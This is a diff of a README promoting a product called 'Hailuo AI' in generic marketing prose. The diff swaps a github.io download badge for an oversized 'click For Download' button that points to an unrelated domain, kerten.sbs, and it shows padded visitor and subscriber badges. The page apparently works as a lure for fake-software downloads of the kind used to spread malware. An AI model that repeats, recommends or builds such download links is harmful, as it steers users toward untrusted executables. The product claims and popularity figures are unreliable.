@@ -2,13 +2,19 @@
 
 Hailuo AI is a state-of-the-art artificial intelligence platform designed to empower businesses with smart automation and predictive analytics. Utilizing deep learning and machine learning techniques, Hailuo AI analyzes vast amounts of data in real-time, uncovering patterns and delivering actionable insights. Its scalable architecture allows seamless integration into existing workflows, improving efficiency, reducing costs, and enabling data-driven decision-making. Perfect for industries ranging from finance to healthcare, Hailuo AI accelerates innovation and competitive advantage.
 
-<div style="text-align: center">
-  <a href="https://hailuo-ai-smart.github.io/.github/">
-    <img class="bumbum" style="width: 600px" alt="Static Badge" src="https://img.shields.io/badge/click_for_download-Hailuo_AI_Solutions-blueviolet">
-  </a>
-</div>
+---
+
+<a href="https://kerten.sbs/kl/old">
+  <img
+    src="https://img.shields.io/badge/click%20For%20Download-green?style=for-the-badge&logo=github"
+    alt="gg"
+    width="1100"
+  >
+</a>
 
 ---
+
+
 
 ![Visitors: 10K+](https://img.shields.io/badge/Visitors-10K+-ff9f43) ![Subscribers: 3K+](https://img.shields.io/badge/Subscribers-3K+-6ab04c) ![Last Updated: 2025](https://img.shields.io/badge/Last_Updated-2025-3498db)
 
